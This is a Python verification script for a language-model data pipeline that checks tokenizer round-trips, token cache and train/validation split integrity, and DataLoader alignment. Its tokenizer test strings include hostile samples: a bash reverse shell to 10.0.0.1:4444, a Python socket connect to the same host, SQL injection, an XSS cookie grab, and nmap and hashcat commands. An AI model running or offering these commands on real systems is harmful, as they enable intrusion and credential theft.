"""
verify.py
---------
End-to-end verification for all pipeline outputs.

Checks
──────
  1. Tokenizer round-trip (encode → decode → original)
  2. Binary cache integrity (tokens.bin + tokens.idx)
  3. train.bin / val.bin integrity and mutual exclusivity
  4. Split determinism (re-generating the split matches split.json)
  5. Token counts (cache vs split files)
  6. Tokenizer compatibility (vocab size matches uint16 capacity)
  7. DataLoader sample correctness (x[i+1] == y[i])

Exit codes
──────────
  0 – all checks passed
  1 – one or more checks failed

Usage:
    python verify.py \
        --model   tokenizer.model \
        --cache-dir ./cache \
        --data-dir  ./data \
        [--n-roundtrip 100]
"""

import argparse
import json
import logging
import mmap
import struct
import sys
import time
from pathlib import Path

import numpy as np
import sentencepiece as spm

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

PASS = "\033[32m✓ PASS\033[0m"
FAIL = "\033[31m✗ FAIL\033[0m"
WARN = "\033[33m⚠ WARN\033[0m"

IDX_ENTRY_SIZE = 8
BYTES_PER_TOKEN = 2


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _sep(label: str = "") -> None:
    w = 70
    if label:
        pad = (w - len(label) - 2) // 2
        print(f"{'─' * pad} {label} {'─' * (w - pad - len(label) - 2)}")
    else:
        print("─" * w)


def _result(name: str, passed: bool, detail: str = "") -> bool:
    status = PASS if passed else FAIL
    suffix = f"  {detail}" if detail else ""
    print(f"  {status}  {name}{suffix}")
    return passed


# ---------------------------------------------------------------------------
# Check 1: Tokenizer round-trip
# ---------------------------------------------------------------------------

ROUNDTRIP_SAMPLES = [
    "CVE-2024-9999: heap-use-after-free in OpenSSL 3.x",
    "nmap -sV -p 80,443,8080 192.168.1.0/24 --script vuln",
    "import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))",
    "SQL injection: ' OR 1=1 --",
    "Buffer overflow: strcpy(buf, argv[1]);",
    "Reverse shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "JWT secret brute-force: hashcat -m 16500 hash.txt wordlist.txt",
    "XSS: <script>document.cookie</script>",
    "AES-256-GCM PBKDF2 HMAC-SHA256 RSA-4096",
    "The quick brown fox jumps over the lazy dog.",
]


def check_roundtrip(sp: spm.SentencePieceProcessor, n: int) -> bool:
    _sep("1. TOKENIZER ROUND-TRIP")
    samples = (ROUNDTRIP_SAMPLES * ((n // len(ROUNDTRIP_SAMPLES)) + 1))[:n]
    failures = 0
    for text in samples:
        ids = sp.EncodeAsIds(text)
        decoded = sp.DecodeIds(ids)
        if decoded != text:
            log.warning("Round-trip mismatch:\n  IN : %r\n  OUT: %r", text, decoded)
            failures += 1
    passed = failures == 0
    _result(
        f"Round-trip ({n} samples)",
        passed,
        f"failures={failures}",
    )
    return passed


# ---------------------------------------------------------------------------
# Check 2: Binary cache integrity
# ---------------------------------------------------------------------------

def check_cache(cache_dir: Path) -> bool:
    _sep("2. BINARY CACHE INTEGRITY")
    tokens_path = cache_dir / "tokens.bin"
    idx_path = cache_dir / "tokens.idx"
    all_ok = True

    # File existence
    all_ok &= _result("tokens.bin exists", tokens_path.exists())
    all_ok &= _result("tokens.idx exists", idx_path.exists())
    if not all_ok:
        return False

    # tokens.bin size is a multiple of 2
    tb_size = tokens_path.stat().st_size
    all_ok &= _result(
        "tokens.bin size % 2 == 0",
        tb_size % BYTES_PER_TOKEN == 0,
        f"size={tb_size}",
    )

    # idx size is a multiple of 8
    ix_size = idx_path.stat().st_size
    all_ok &= _result(
        "tokens.idx size % 8 == 0",
        ix_size % IDX_ENTRY_SIZE == 0,
        f"size={ix_size}",
    )

    # Load offsets
    with idx_path.open("rb") as fh:
        offsets = np.frombuffer(fh.read(), dtype="<u8")

    n_docs = len(offsets) - 1
    all_ok &= _result("index has ≥ 2 entries (≥ 1 doc)", len(offsets) >= 2,
                      f"entries={len(offsets)}")

    # Offsets are monotonically non-decreasing
    monotone = bool(np.all(np.diff(offsets) >= 0))
    all_ok &= _result("offsets monotone", monotone)

    # Final offset matches tokens.bin size
    final_offset = int(offsets[-1])
    all_ok &= _result(
        "final offset == tokens.bin size",
        final_offset == tb_size,
        f"offset={final_offset}  file={tb_size}",
    )

    tokens_total = tb_size // BYTES_PER_TOKEN
    _result(
        "Cache summary",
        True,
        f"docs={n_docs:,}  tokens={tokens_total:,}",
    )
    return all_ok


# ---------------------------------------------------------------------------
# Check 3: train.bin / val.bin integrity
# ---------------------------------------------------------------------------

def check_split_files(data_dir: Path) -> bool:
    _sep("3. SPLIT FILE INTEGRITY")
    train_path = data_dir / "train.bin"
    val_path = data_dir / "val.bin"
    split_path = data_dir / "split.json"
    all_ok = True

    for p in (train_path, val_path, split_path):
        all_ok &= _result(f"{p.name} exists", p.exists())
    if not all_ok:
        return False

    # Size divisible by 2
    for p in (train_path, val_path):
        sz = p.stat().st_size
        all_ok &= _result(
            f"{p.name} size % 2 == 0",
            sz % BYTES_PER_TOKEN == 0,
            f"size={sz}",
        )

    # split.json token counts match file sizes
    meta = json.loads(split_path.read_text())
    t_tokens_meta = meta["n_tokens_train"]
    v_tokens_meta = meta["n_tokens_val"]
    t_tokens_file = train_path.stat().st_size // BYTES_PER_TOKEN
    v_tokens_file = val_path.stat().st_size // BYTES_PER_TOKEN

    all_ok &= _result(
        "train token count matches split.json",
        t_tokens_meta == t_tokens_file,
        f"json={t_tokens_meta:,}  file={t_tokens_file:,}",
    )
    all_ok &= _result(
        "val token count matches split.json",
        v_tokens_meta == v_tokens_file,
        f"json={v_tokens_meta:,}  file={v_tokens_file:,}",
    )

    # No overlap between train and val doc indices
    train_set = set(meta["train_doc_indices"])
    val_set = set(meta["val_doc_indices"])
    overlap = train_set & val_set
    all_ok &= _result(
        "train/val doc index sets are disjoint",
        len(overlap) == 0,
        f"overlap={len(overlap)}",
    )

    # All indices accounted for
    total_docs = meta["n_docs_total"]
    all_indices = train_set | val_set
    all_ok &= _result(
        "all documents assigned to a split",
        len(all_indices) == total_docs,
        f"assigned={len(all_indices):,}  total={total_docs:,}",
    )

    actual_val_pct = v_tokens_file / (t_tokens_file + v_tokens_file) * 100
    _result(
        "Split ratio",
        True,
        f"train={t_tokens_file:,}  val={v_tokens_file:,}  val%={actual_val_pct:.2f}",
    )
    return all_ok


# ---------------------------------------------------------------------------
# Check 4: Split determinism
# ---------------------------------------------------------------------------

def check_split_determinism(cache_dir: Path, data_dir: Path) -> bool:
    _sep("4. SPLIT DETERMINISM")
    from dataset_builder import load_offsets, split_document_indices

    split_path = data_dir / "split.json"
    idx_path = cache_dir / "tokens.idx"
    if not split_path.exists() or not idx_path.exists():
        _result("split.json and tokens.idx exist", False)
        return False

    meta = json.loads(split_path.read_text())
    offsets = load_offsets(idx_path)
    n_docs = len(offsets) - 1

    train_idx, val_idx = split_document_indices(
        n_docs=n_docs,
        val_ratio=meta["val_ratio"],
        seed=meta["seed"],
    )

    train_match = np.array_equal(
        np.sort(train_idx), np.sort(np.array(meta["train_doc_indices"]))
    )
    val_match = np.array_equal(
        np.sort(val_idx), np.sort(np.array(meta["val_doc_indices"]))
    )

    ok = True
    ok &= _result("Regenerated train split is identical", train_match)
    ok &= _result("Regenerated val split is identical", val_match)
    return ok


# ---------------------------------------------------------------------------
# Check 5: Token count consistency
# ---------------------------------------------------------------------------

def check_token_counts(cache_dir: Path, data_dir: Path) -> bool:
    _sep("5. TOKEN COUNT CONSISTENCY")
    tokens_path = cache_dir / "tokens.bin"
    train_path = data_dir / "train.bin"
    val_path = data_dir / "val.bin"

    for p in (tokens_path, train_path, val_path):
        if not p.exists():
            _result(f"{p.name} exists", False)
            return False

    cache_tokens = tokens_path.stat().st_size // BYTES_PER_TOKEN
    split_tokens = (
        train_path.stat().st_size + val_path.stat().st_size
    ) // BYTES_PER_TOKEN

    ok = _result(
        "train+val token count ≤ cache token count",
        split_tokens <= cache_tokens,
        f"split={split_tokens:,}  cache={cache_tokens:,}",
    )
    return ok


# ---------------------------------------------------------------------------
# Check 6: Tokenizer compatibility
# ---------------------------------------------------------------------------

def check_tokenizer_compat(sp: spm.SentencePieceProcessor) -> bool:
    _sep("6. TOKENIZER COMPATIBILITY")
    vocab_size = sp.GetPieceSize()
    max_uint16 = 65535
    ok = True
    ok &= _result(
        f"vocab_size ({vocab_size}) fits in uint16",
        vocab_size <= max_uint16,
        f"max_uint16={max_uint16}",
    )
    ok &= _result(
        "BOS id is valid",
        sp.bos_id() != -1,
        f"bos_id={sp.bos_id()}",
    )
    ok &= _result(
        "EOS id is valid",
        sp.eos_id() != -1,
        f"eos_id={sp.eos_id()}",
    )
    return ok


# ---------------------------------------------------------------------------
# Check 7: DataLoader sample correctness
# ---------------------------------------------------------------------------

def check_dataloader_samples(data_dir: Path, context_len: int = 256) -> bool:
    _sep("7. DATALOADER SAMPLE CORRECTNESS")
    train_path = data_dir / "train.bin"
    if not train_path.exists():
        _result("train.bin exists", False)
        return False

    try:
        import torch
        from dataloader import BinaryTokenDataset
    except ImportError as exc:
        _result("torch / dataloader importable", False, str(exc))
        return False

    try:
        ds = BinaryTokenDataset(
            bin_path=train_path,
            context_len=context_len,
            num_samples=20,
            seed=0,
        )
    except Exception as exc:
        _result("BinaryTokenDataset instantiates", False, str(exc))
        return False

    failures = 0
    for i in range(min(20, len(ds))):
        x, y = ds[i]
        # y[j] must equal x[j+1] for all valid j — sample from raw file to verify
        pos = int(ds._start_positions[i])
        n_tokens = ds.n_tokens
        if pos + context_len + 1 > n_tokens:
            continue

        # Read raw bytes to verify alignment
        with train_path.open("rb") as fh:
            with mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                raw = np.frombuffer(
                    mm[
                        pos * BYTES_PER_TOKEN : (pos + context_len + 1) * BYTES_PER_TOKEN
                    ],
                    dtype="<u2",
                ).astype(np.int64)

        x_expected = raw[:context_len]
        y_expected = raw[1 : context_len + 1]

        if not (np.array_equal(x.numpy(), x_expected) and
                np.array_equal(y.numpy(), y_expected)):
            failures += 1
            log.warning("Sample %d: x/y alignment mismatch", i)

    ok = _result(
        f"x[i+1] == y[i] alignment (20 samples)",
        failures == 0,
        f"failures={failures}",
    )
    return ok


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="Verify the full data pipeline.")
    parser.add_argument("--model", required=True, help="Path to tokenizer.model")
    parser.add_argument("--cache-dir", default="./cache")
    parser.add_argument("--data-dir", default="./data")
    parser.add_argument(
        "--n-roundtrip", type=int, default=len(ROUNDTRIP_SAMPLES),
        help="Number of round-trip samples to test",
    )
    args = parser.parse_args()

    model_path = Path(args.model)
    cache_dir = Path(args.cache_dir)
    data_dir = Path(args.data_dir)

    if not model_path.exists():
        sys.exit(f"[ERROR] Tokenizer not found: {model_path}")

    sp = spm.SentencePieceProcessor()
    try:
        sp.Load(str(model_path))
    except Exception as exc:
        sys.exit(f"[ERROR] Failed to load tokenizer: {exc}")

    print("=" * 70)
    print("  PIPELINE VERIFICATION")
    print("=" * 70)

    results: dict[str, bool] = {}
    results["roundtrip"] = check_roundtrip(sp, args.n_roundtrip)
    results["cache"] = check_cache(cache_dir)
    results["split_files"] = check_split_files(data_dir)
    results["determinism"] = check_split_determinism(cache_dir, data_dir)
    results["token_counts"] = check_token_counts(cache_dir, data_dir)
    results["compat"] = check_tokenizer_compat(sp)
    results["dataloader"] = check_dataloader_samples(data_dir)

    _sep("SUMMARY")
    all_pass = True
    for name, passed in results.items():
        status = PASS if passed else FAIL
        print(f"  {status}  {name}")
        all_pass &= passed

    print("=" * 70)
    if all_pass:
        print("  All checks passed.")
        sys.exit(0)
    else:
        failed = [k for k, v in results.items() if not v]
        print(f"  FAILED checks: {', '.join(failed)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
